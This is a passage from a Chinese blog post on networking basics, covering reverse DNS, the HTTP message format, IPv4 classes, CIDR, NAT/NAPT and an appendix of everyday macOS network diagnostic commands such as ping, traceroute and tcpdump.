<p>上面的DNS查询均为正向DNS查询：已经知道域名，想要查询对应 IP。而反向 DNS(reverse DNS)是已经知道IP的前提下，想要查询域名。反向 DNS 也是采用分层查询方式，对于一个 IP 地址(比如106.10.170.118)，依次查询in-addr.arpa节点(如果是IPv6，则为ip6.arpa节点)，106节点，10节点，170节点，并在该节点获得 106.10.170.118 对应的域名。</p>
<h3 id="HTTP_u534F_u8BAE_u6982_u89C8"><a href="#HTTP_u534F_u8BAE_u6982_u89C8" class="headerlink" title="HTTP协议概览"></a>HTTP协议概览</h3><p>我在 TCP 流通信中说明了，TCP 协议实现了数据流的传输。然而，人们更加习惯以文件为单位传输资源，比如文本文件，图像文件，超文本文档(hypertext document)。</p>
<p>超文本文档中包含有超链接，指向其他的资源。超文本文档是万维网(World Wide Web，即www)的基础。</p>
<p>HTTP 协议解决文件传输的问题。HTTP 是应用层协议，主要建立在 TCP 协议之上(偶尔也可以 UDP 为底层)。它随着万维网的发展而流行。HTTP 协议目的是，如何在万维网的网络环境下，更好的利用 TCP 协议，以实现文件，特别是超文本文件的传输。</p>
<p>早期的 HTTP 协议主要传输静态文件，即真实存储在服务器上的文件。随着万维网的发展，HTTP 协议被用于传输“动态文件”，服务器上的程序根据 HTTP 请求即时生成的动态文件。我们将 HTT P的传输对象统称为资源(resource)。</p>
<p>HTTP实现了资源的订购和传送。其工作方式类似于快餐点单。</p>
<ol>
<li>请求(request): 顾客向服务员提出请求：“来个鸡腿汉堡”。</li>
<li>回复(response):服务员根据情况，回应顾客的请求</li>
</ol>
<p>根据情况的不同，服务员的回应可能有很多，比如:</p>
<ul>
<li>服务员准备鸡腿汉堡，将鸡腿汉堡交给顾客。（一切OK）</li>
<li>服务员发现自己只是个甜品站。他让顾客前往正式柜台点单。（重新定向）</li>
<li>服务员告诉顾客鸡腿汉堡没有了。(无法找到)</li>
</ul>
<p>交易结束后，服务员就将刚才的交易抛到脑后，准备服务下一位顾客。</p>
<p>HTTP协议的通信是一次 request-responce 交流。客户端(guest)向服务器发出请求(request)，服务器(server)回复(response)客户端。</p>
<p><img src="/images/14551396675029.jpg" alt=""></p>
<p>HTTP协议规定了请求和回复的格式:</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">起始行 <span class="comment">(start line)</span></span><br><span class="line">头信息 <span class="comment">(headers)</span></span><br><span class="line"></span><br><span class="line">主体<span class="comment">(entity body)</span></span><br></pre></td></tr></table></figure>
<p>起始行只有一行。它包含了请求/回复最重要的信息。请求的起始行表示(顾客)“想要什么”。回复的起始行表示(后厨)“发生什么”。</p>
<p>头信息可以有多行。每一行是一对键值对(key-value pair)，比如:</p>
<pre><code>Content-type: text/plain 
</code></pre><p>它表示，包含有一个名为 Content-type 的参数，该参数的值为 text/plain。头信息是对起始行的补充。请求的头信息对服务器有指导意义 (好像在菜单上注明: 鸡腿不要辣)。回复的头信息则是提示客户端（比如，在盒子上注明: 小心烫）</p>
<p>主体部分包含了具体的资源。上图的请求中并没有主体，因为我们只是在下单，而不用管后厨送什么东西 (请求是可以有主体内容的)。回复中包含的主体是一段文本文字(Hello World!)。这段文本文字正是顾客所期待的，鸡腿汉堡。</p>
<p>我们深入一些细节。先来看一下请求:</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /index<span class="class">.html</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: www<span class="class">.example</span><span class="class">.com</span></span><br></pre></td></tr></table></figure>
<p>在起始行中，有三段信息:</p>
<p>GET 方法。用于说明想要服务器执行的操作。<br>/index.html 资源的路径。这里指向服务器上的index.html文件。<br>HTTP/1.1 协议的版本。HTTP第一个广泛使用的版本是1.0，当前版本为1.1。</p>
<p>早期的 HTTP 协议只有 GET 方法。遵从 HTTP 协议，服务器接收到 GET 请求后，会将特定资源传送给客户。这类似于客户点单，并获得汉堡的过程。使用 GET 方法时，是客户向服务器索取资源，所以请求往往没有主体部分。</p>
<p>GET 方法也可以用于传输一些不重要的数据。它是通过改写 URL 的方式实现的。GET 的数据利用 <code>URL?变量名＝变量值</code> 的方法传输。比如向 <a href="http://127.0.0.1" target="_blank" rel="external">http://127.0.0.1</a> 发送一个变量“q”，它的值为“a”。那么，实际的URL为<a href="http://127.0.0.1?q=a。服务器收到请求后，就可以知道&quot;q&quot;的值为&quot;a&quot;。" target="_blank" rel="external">http://127.0.0.1?q=a。服务器收到请求后，就可以知道&quot;q&quot;的值为&quot;a&quot;。</a></p>
<p>GET 方法之外，最常用的是 POST 方法。它用于从客户端向服务器提交数据。使用 POST 方法时，URL 不再被改写。数据位于 http 请求的主体。POST 方法最用于提交 HTML 的 form 数据。服务器往往会对 POST 方法提交的数据进行一定的处理，比如存入服务器数据库。</p>
<p>样例请求中有一行头信息。该头信息的名字是 Host。HTTP 的请求必须有 Host 头信息，用于说明服务器的地址和端口。HTTP 协议的默认端口是 80，如果在 HOST 中没有说明端口，那么将默认采取该端口。在该例子中，服务器的域名为 www.example.com，端口为 80。域名将通过 DNS 服务器转换为 IP 地址，从而确定服务器在互联网上的地址。</p>
<p>服务器在接收到请求之后，会根据程序，生成对应于该请求的回复，比如:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="status">HTTP/1.1 <span class="number">200</span> OK</span></span><br><span class="line"><span class="attribute">Content-type</span>: <span class="string">text/plain</span></span><br><span class="line"><span class="attribute">Content-length</span>: <span class="string">12</span></span><br><span class="line"></span><br><span class="line"><span class="erlang-repl"><span class="variable">Hello</span> <span class="variable">World</span><span class="exclamation_mark">!</span></span></span><br></pre></td></tr></table></figure>
<p>回复的起始行同样包含三段信息</p>
<ul>
<li>HTTP/1.1 协议版本</li>
<li>200 状态码(status code)。</li>
<li>OK 状态描述</li>
</ul>
<p>OK 是对状态码 20 0的文字描述，它只是为了便于人类的阅读。电脑只关心三位的状态码(status code)，即这里的 200。200 表示一切 OK，资源正常返回。状态码代表了服务器回应动作的类型。</p>
<p>其它常见的状态码还有:</p>
<ul>
<li>302，重新定向(redirect): 我这里没有你想要的资源，但我知道另一个地方xxx有，你可以去那里找。</li>
<li>404，无法找到(not found): 我找不到你想要的资源，无能为力。</li>
</ul>
<p>(重新定向时，客户端可以根据302的建议前往xxx寻找资源，也可以忽略该建议。)</p>
<p>Content-type 说明了主体所包含的资源的类型。根据类型的不同，客户端可以启动不同的处理程序(比如显示图像文件，播放声音文件等等)。下面是一些常见的资源</p>
<ul>
<li>text/plain 普通文本</li>
<li>text/html HTML 文本</li>
<li>image/jpeg jpeg 图片</li>
<li>image/gif gif 图片</li>
<li>Content-length 说明了主体部分的长度，以字节(byte)为单位。</li>
</ul>
<p>回应的主体部分为一段普通文本，即</p>
<pre><code>Hello World!
</code></pre><p>根据早期的 HTTP 协议，每次 request-reponse 时，都要重新建立 TCP 连接。TCP 连接每次都重新建立，所以服务器无法知道上次请求和本次请求是否来自于同一个客户端。因此，HTTP 通信是无状态(stateless)的。服务器认为每次请求都是一个全新的请求，无论该请求是否来自同一地址。</p>
<p>想象高级餐厅和快餐店。高级餐厅会知道客人所在的位置，如果新增点单，那么服务员知道这和上一单同一桌。而在快餐店中，不好意思，服务员并不记录客人的特征。想再次点单？请重新排队……</p>
<p>随着 HTTP 协议的发展，HTTP 协议允许 TCP 连接复用，以节省建立连接所耗费的时间。但HTTP协议依然保持无状态的特性。</p>
<h2 id="u7EFC_u5408"><a href="#u7EFC_u5408" class="headerlink" title="综合"></a>综合</h2><h3 id="CIDR__u4E0E_NAT"><a href="#CIDR__u4E0E_NAT" class="headerlink" title="CIDR 与 NAT"></a>CIDR 与 NAT</h3><p>IPv4 由于最初的设计原因，长度只有 32 位，所以只提供了大约 40 亿个地址。这造成了 IPv4 地址的耗尽危机。随后，IPv6 被设计出来，并可以提供足够多的 IP 地址。但是 IPv4 与 IPv6 并不兼容，IPv4 向 IPv6 的迁移并不容易。一些技术，比如说这里要说的 CIDR 和 NAT，相继推广。这些技术可以缓解 IPv4 的稀缺状态，成就了 IPv4 一时的逆袭。</p>
<p>CIDR(Classless Inter Domain Routing)改进了传统的 IPv4 地址分类。传统的 IP 分类将 IP 地址直接对应为默认的分类，从而将 Internet 分割为网络。CIDR 在路由表中增加了子网掩码(subnet masking)，从而可以更细分网络。利用 CIDR，我们可以灵活的将某个范围的IP地址分配给某个网络。</p>
<p>1) IP地址分类</p>
<p>在IP接力赛中，我提到，IP地址可以分为如下几类：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IP <span class="keyword">class</span>    From          To                 Subnet Mask</span><br><span class="line">A           <span class="number">1.0</span><span class="number">.0</span><span class="number">.0</span>       <span class="number">126.255</span><span class="number">.255</span><span class="number">.255</span>    <span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">B           <span class="number">128.0</span><span class="number">.0</span><span class="number">.0</span>     <span class="number">191.255</span><span class="number">.255</span><span class="number">.255</span>    <span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">C           <span class="number">192.0</span><span class="number">.0</span><span class="number">.0</span>     <span class="number">223.255</span><span class="number">.255</span><span class="number">.255</span>    <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>
<p>这是最初的IPv4地址分类设计。一个IPv4地址总共有32位，可以分为网络(network)和主机(host)两部分。子网掩码(subnet mask)是用于表示哪些位代表了网络部分。比如如下 subnet mask 255.0.0.0的二进制表示为：</p>
<p>11111111 00000000 00000000 00000000</p>
<p>它的前八位为 1，所以表示IP地址的前八位为网络部分。而后面的 24 位代指该网络的各个主机。一个 A 类网络可以有 224 台主机，也就是 16777216。由于 IPv4 地址已经分好了类，所以当我们拿到一个 IP 地址，我们就可以通过上面查到它的子网掩码。(B类，216; C类，28)</p>
<p>2) 传统路由表</p>
<p>IP分类的方便了IP包的接力。IP包到达某个路由器后，会根据该路由器的路由表(routing table)，来决定接力的下一站。一个传统的路由表看起来是这样的：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Destination        Gateway             Iface</span><br><span class="line"><span class="number">199.165</span><span class="number">.145</span><span class="number">.0</span>      <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>             eth0</span><br><span class="line"><span class="number">199.165</span><span class="number">.146</span><span class="number">.0</span>      <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>             eth1</span><br><span class="line"><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>            <span class="number">199.165</span><span class="number">.146</span><span class="number">.8</span>       eth1</span><br></pre></td></tr></table></figure>
<p>该路由表代表的网络拓扑如下：</p>
<p><img src="/images/14551396849165.jpg" alt=""></p>
<p>由于 IP 分类，我们不需要记录 subnet mask。当我们要前往 199.165.146.17 时，我们已经知道这台主机位于一个 C 类地址，所以它的子网掩码是 255.255.255.0，也就是说 199.165.146 代表了网络，17 代表了主机。</p>
<p>3) CIDR 路由表</p>
<p>然而，由于默认分类，造成了网络只能按照 A、B、C 的方式存在。假设一个网络(比如 MIT 的网络)分配了一个 A 类地址，那么该网络将容许 16777216 个主机。如果该网络无法用完这些 IP 地址，这些 IP 地址将无法被其他网络使用。再比如上面的网络，199.165.145 必须作为一个整个的网络存在。如果我们只有 10 台主机，那么将会有 200 多个 IP 地址被浪费。CIDR 的本质是在路由表中加入子网掩码，并根据该列信息对网络进行分割，而不是根据默认的 A，B，C 进行分割。比如：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Destination        Gateway             Genmask             Iface</span><br><span class="line"><span class="number">199.165</span><span class="number">.145</span><span class="number">.254</span>    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>             <span class="number">255.255</span><span class="number">.255</span><span class="number">.254</span>     eth2</span><br><span class="line"><span class="number">199.165</span><span class="number">.145</span><span class="number">.0</span>      <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>             <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>       eth0</span><br><span class="line"><span class="number">199.165</span><span class="number">.146</span><span class="number">.0</span>      <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>             <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>       eth1</span><br><span class="line"><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>            <span class="number">199.165</span><span class="number">.146</span><span class="number">.8</span>       <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>             eth1</span><br></pre></td></tr></table></figure>
<p>根据路由表的第一条记录，</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">199.165</span><span class="number">.145</span><span class="number">.254</span> (IP address) : <span class="number">11000111</span> <span class="number">10100101</span> <span class="number">10010001</span> <span class="number">11111110</span></span><br><span class="line"><span class="number">255.255</span><span class="number">.255</span><span class="number">.254</span> (subnet mask): <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111110</span> (<span class="number">31</span>个<span class="number">1</span>，<span class="number">1</span>个<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>通过子网掩码可以知道，前 31 位表示网络，最后一位表示主机。子网掩码总是有连续多个 1 组成，比如上面的 31 个 1。所以也可记为 199.165.145.254/31，来同时表示 IP 地址和子网掩码。</p>
<p>路由器将原来的 199.165.145 网络中的一部分分割出来。这一网络可以容纳两台电脑，也就是 199.165.145.254 和 199.165.145.255。这个网络对应网卡是 eth2。当有 IP 包通向这两个 IP 地址时，会前往 eth2，而不是 eth0。</p>
<p>网络拓扑如下：</p>
<p><img src="/images/14551396962662.jpg" alt=""></p>
<p>利用 CIDR，我们可以将 IP 地址根据需要进行分割，从而不浪费 IP 地址。</p>
<p>CIDR 虽然可以更加节约 IP 地址，但它并不能创造新的 IP 地址。IP 地址的耗尽危机并不能因此得到解决。我们来看 IPv4 的第二袭，NAT(Network Address Translation)。</p>
<p>理论上，每个 IP 地址代表了 Internet 上的一个设备。但有一些 IP 地址被保留，用于一些特殊用途。下面三段IP地址被保留用作私有 IP 地址：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">From          To             </span><br><span class="line"><span class="number">10.0</span><span class="number">.0</span><span class="number">.0</span>      <span class="number">10.255</span><span class="number">.255</span><span class="number">.255</span></span><br><span class="line"><span class="number">172.16</span><span class="number">.0</span><span class="number">.0</span>    <span class="number">172.31</span><span class="number">.255</span><span class="number">.255</span></span><br><span class="line"><span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span>   <span class="number">192.168</span><span class="number">.255</span><span class="number">.255</span></span><br></pre></td></tr></table></figure>
<p>私有 IP 地址只用于局域网内部。理论上，我们不应该在互联网上看到来自或者发往私有 IP 地址的 IP 包。与私有 IP 地址对应的是全球 IP 地址(global IP address)。</p>
<p>NAT 是为私有网络(private network)服务的。该网络中的主机使用私有IP地址。当私有网络内部主机和外部 Internet 通信时，网关(gateway)路由器负责将私有 IP 地址转换为全球 IP 地址，这个地址转换过程就是 Network Address Translation。网关路由器的 NAT 功能。最极端情况下，我们可以只分配一个全球 IP 地址给网关路由器，而私有网络中的设备都使用私有 IP 地址。由于私有 IP 地址可以在不同私有网络中重复使用，所以就大大减小了设备对 IP 地址的需求。</p>
<p>1) 基础 NAT</p>
<p>NAT 的一种为基础 NAT，也成为一对一(one-to-one)NAT。在基础 NAT 下，网关路由器一一转换一个外部 IP 地址和一个私有 IP 地址。网关路由器保存有 IP 的 NAT 对应关系，比如：</p>
<p><img src="/images/14551397079720.jpg" alt=""></p>
<p>上面网络中，当有 IP 包要前往 199.165.145.1 时，网关路由器会将目的地改写为 10.0.0.1，并接力给私有网络中的 10.0.0.1 的电脑。同样，当 10.0.0.1 的电脑向 Internet 发送 IP 包时，它的发送地为 10.0.0.1。在到达网关路由器时，会将发送地更改为 199.165.145.1。此外，IP 头部的 checksum，以及更高层协议(比如 UDP 和 TCP)中的校验 IP 的 checksum 也会更改。</p>
<p>基础 NAT 尽管是一对一转换 IP 地址，它还是可以减小内部网络对 IP 地址的需求。通常来说，一个局域网中只有少数的设备处于开机状态，并不需要给每个设备对应一个全球 IP 地址。NAT 可以动态的管理全球 IP 地址，并将全球 IP 地址对应到开机设备，从而减小内部网络对 IP 地址的需求。</p>
<p>2) NAPT</p>
<p>NAT 还有一种，被成为 NAPT (Network Address and Port Translation)。在基础 NAT 中，高层协议的端口号并不会改动。NAPT 下，IP 地址和端口号可能同时改动。</p>
<p>我们在 UDP 和 TCP 中提到端口(port)的概念。在建立 UDP 或者 TCP 通信时，我们实际上是用 IP:Port 来代表通信的一端(正如打电话时主机:分机号一样)。NAPT 就是在网关路由器处建立两个通信通道，一个通往内部网络，一个通往外部网络，然后将网关处的通道端口连接，从而让内部和外部通信。比如：</p>
<p><img src="/images/14551397204458.jpg" alt=""></p>
<p>我们看到，通往 IP 199.165.145.1 建立了三个端口的连接：8888, 8889 和 8080。它们分别在 NAPT 处改为通往 10.0.0.1:80, 10.0.0.1:8080 和 10.0.0.3:6000。NAPT 记录有 外部IP:端口 和 内部IP:端口 的一一对应关系。在 IP 包经过时，网关路由器会更改 IP 地址，端口号以及相关的 checksum。</p>
<p>利用 NAPT 我们可以使用一个(或者多个但少量的)外部 IP 和大量的端口号，来对应多个内部 IP 以及相应的端口号，从而大大减小了对全球 IP 地址的需求。</p>
<p>无论是基础 NAT 还是 NAPT，它们的设置都比较复杂，并且从本质上违背了互联网最初的设计理念。但由于 IPv4 的使用惯性，NAT 还是被广泛推广。由于 NAT 所处的网关服务器是理想的设置防火墙的位置，NAT 还往往和防火墙共同建设，以提高私有网络的安全性。</p>
<p>即使是 CIDR 和 NAT 广泛使用，IPv4 还是在不可避免的耗尽。IPv6 正在加紧部署。但上述的两种技术，CIDR 和 NAT 在 IPv6 中同样被采用，所以了解它们依然是有意义的。</p>
<h2 id="u9644_u5F55"><a href="#u9644_u5F55" class="headerlink" title="附录"></a>附录</h2><p>下面是一些Mac OS X下常用的网络诊断命令。它们能帮助我们发现网络问题。有些工具，如 <code>arping</code>, <code>arp-scan</code>，需要借助 HomeBrew 安装。</p>
<p>网络诊断的第一步，是了解自己的设备，比如有哪些接口，IP地址都是什么。</p>
<pre><code># 显示网络接口(interface)信息
# 如接口名称，接口类型，接口的 IP 地址，硬件的 MAC 地址等。
ifconfig
</code></pre><p>ARP 协议用在局域网(LAN)内部。借用 ARP 协议，设备可以知道同一局域网内的 IP-MAC 对应关系。当我们访问一个本地 IP 地址时，设备根据该对应关系，与对应的 MAC 地址通信。通过 ARP 工具，我们可以知道局域网内的通信是否正常。</p>
<pre><code># 显示本地存储的 IP-MAC 对应关系
arp -a

# 经 eth0 接口，发送 ARP 请求，查询 IP 为 192.168.1.1 设备的 MAC 地址
sudo arping -I eth0 192.168.1.1

# 查询整个局域网内的所有IP地址的对应 MAC 地址
sudo arp-scan -l

# 监听 en0 接口的 arp 协议通信
sudo tcpdump -i en0 arp
</code></pre><p>网络层是一个广域的互联网，互联网上的设备用 IP 地址识别。ping 是向某个 IP 地址发送 ICMP 协议的 <code>ECHO_REQUEST</code> 请求。收到该请求的设备，将返回 ICMP 回复。如果 ping 到某个 IP 地址，那么说明该IP地址的设备可以经网络层顺利到达。</p>
<pre><code># 向 IP 地址 192.168.1.255 发送 ICMP 请求
# 如果该地址的 ICMP 没有被禁用，那么在该网上的设备将回复。
ping 192.168.1.1

# 向广播(broadcast)地址 192.168.1.255 发送 ICMP 请求
# 如果 ICMP 没有被禁用，那么在该网上的设备将回复
# 需要注意的是，许多设备会禁用 ICMP
# 如果 ping 不到一个设备，并不一定是网络层故障。
ping 192.168.1.255
</code></pre><p>如果两个设备有相同的 IP 地址，将导致 IP 冲突。许多网络中是由 DHCP 协议自动分配 IP 地址的，这样可以极大的减少 IP 冲突的可能性。DHCP 服务器与设备达成协议，设备将在一定时间内占据某个 IP 地址，而 DHCP 服务器不再把该 IP 地址分配给别人。</p>
<pre><code>sudo ipconfig set en0 DHCP
更新 DHCP 租约。设备将释放 IP 地址，再从 DHCP 服务器重新获得 IP 地址。

sudo ipconfig set en0 INFORM 192.168.0.120
将接口 en0 设定为静态 IP 地址。
</code></pre><p>局域网通过路由器，接入广域的互联网。互联网上的通信往往要经过多个路由器接力。途中路由器的故障，可能导致互联网访问异常。</p>
<pre><code># 显示路由表。从路由表中，可以找到网关(Gateway)
# 网关是通向更加广域网络的出口
netstat -nr

# 追踪到达IP目的地的全程路由
traceroute 74.125.128.99

# 通过ICMP协议，追踪路由
# ICMP协议经常会被禁用，所以会返回&quot;*&quot;的字符串。
traceroute -I 74.125.128.99

# 通过TCP协议，经80端口，追踪路由
# TCP协议的默认端口80很少会被禁用
sudo traceroute -T -p 80 74.125.128.99
</code></pre><p>tcpdump 是一款网络抓包工具。它可以监听网络接口不同层的通信，并过滤出特定的内容，比如特定协议、特定端口等等。我们上面已经使用 tcpdump 监听了 ARP 协议通信。这里我们来看更多的监听方式。</p>
<pre><code># 监听en0接口的所有通信
sudo tcpdump -i en0

# 用ASCII显示en0接口的通信内容
sudo tcpdump -A -i en0 

# 显示en0接口的8080端口的通信
sudo tcpdump -i en0 &apos;port 8080&apos;

# 显示eth1接口，来自192.168.1.200的通信
sudo tcpdump -i eth1 src 192.168.1.200

# 显示eth1接口80端口，目的地为192.168.1.101的通信
sudo tcpdump -i eth1 dst 192.168.1.101 and port 80

# 将lo0接口的通信存入文件record.pcap
sudo tcpdump -w record.pcap -i lo0
</code></pre><p>DNS是在域名和IP之间进行翻译。DNS故障会导致我们无法通过域名访问某个网址。 </p>
<pre><code># DNS域名解析。返回域名对应的IP地址
host www.sina.com.cn
</code></pre><h2 id="u53C2_u8003_u8D44_u6599"><a href="#u53C2_u8003_u8D44_u6599" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="http://www.cnblogs.com/vamei/" target="_blank" rel="external">Vamei</a></li>
<li><a href="http://www.cnblogs.com/maybe2030/" target="_blank" rel="external">Poll 的笔记</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>这篇文章主要介绍计算机网络的相关知识，因为网络的重要组成不是是协议，所以很大篇幅会是相关协议以及具体的应用。整体的结构基于 <a href="http://www.cnblogs.com/vamei/">Vamei</a> 博客中的结构（以及一些配图），加上自己在网络上搜集和日常学习中的一些思考，整理成为本文。</p>]]>
    
    </summary>
    
      <category term="协议" scheme="http://wdxtub.com/tags/%E5%8D%8F%E8%AE%AE/"/>
    
      <category term="基础" scheme="http://wdxtub.com/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="网络" scheme="http://wdxtub.com/tags/%E7%BD%91%E7%BB%9C/"/>
    
      <category term="计算机" scheme="http://wdxtub.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
</feed>
